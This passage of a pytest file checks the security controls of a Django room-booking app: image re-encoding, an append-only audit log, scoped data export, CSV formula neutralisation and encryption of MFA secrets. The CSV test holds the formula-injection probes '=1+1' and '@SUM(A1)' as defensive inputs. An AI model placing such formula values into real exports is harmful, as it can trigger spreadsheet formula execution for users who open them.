    with pytest.raises(ValidationError):
        clean_image(SimpleUploadedFile(name, content, content_type=ctype))


def test_photo_upload_is_reencoded_without_metadata():
    out = clean_image(SimpleUploadedFile("room.png", _png_bytes(), content_type="image/png"))
    assert out.name.endswith(".webp")
    assert Image.open(io.BytesIO(out.read())).format == "WEBP"


def test_photo_upload_size_cap(settings):
    settings.MAX_IMAGE_UPLOAD_BYTES = 10
    with pytest.raises(ValidationError):
        clean_image(SimpleUploadedFile("room.png", _png_bytes(), content_type="image/png"))


# ── Audit log integrity and DPDP export ─────────────────────────────────────


def test_audit_log_is_append_only(student, booked):
    entry = AuditLog.objects.filter(action="booking.create").latest("created_at")
    with pytest.raises(DatabaseError), transaction.atomic():
        AuditLog.objects.filter(pk=entry.pk).update(action="tampered")
    with pytest.raises(DatabaseError), transaction.atomic():
        entry.delete()


def test_role_changes_are_audited(admin_user, student):
    change_role(student, Role.FACULTY, actor=admin_user)
    entry = AuditLog.objects.get(action="user.role_change", target_id=str(student.pk))
    assert entry.before == {"role": Role.STUDENT} and entry.after == {"role": Role.FACULTY}
    assert entry.actor_id == admin_user.pk


def test_data_export_contains_only_the_callers_data(client, student, make_user, booked):
    other = make_user()
    client.force_login(other)
    data = client.get(reverse("accounts:export")).json()
    assert data["profile"]["username"] == other.username
    assert data["bookings"] == []
    assert "mfa_secret" not in data["profile"] and "password" not in data["profile"]


def test_analytics_csv_neutralises_formulas():
    from apps.analytics.views import _safe

    assert _safe("=1+1") == "'=1+1"
    assert _safe("@SUM(A1)") == "'@SUM(A1)"
    assert _safe("Room 34-301") == "Room 34-301"


def test_department_heads_cannot_widen_their_analytics_scope(client, make_user, lpu):
    from apps.accounts.models import Department

    ece = Department.objects.create(institution=lpu, code="ECE", name="Electronics")
    head = make_user(Role.DEPT_HEAD)
    client.force_login(head)
    resp = client.get(reverse("analytics:export", args=["overview"]), {"department": ece.code})
    assert resp.status_code == 200
    assert "-cse-" in resp["Content-Disposition"]  # still their own department (CSE)


def test_superuser_secret_is_encrypted_at_rest(admin_user):
    secret = _enrol_mfa(admin_user)
    stored = User.objects.get(pk=admin_user.pk).mfa_secret
    assert secret not in stored
    assert mfa.decrypt(stored) == secret
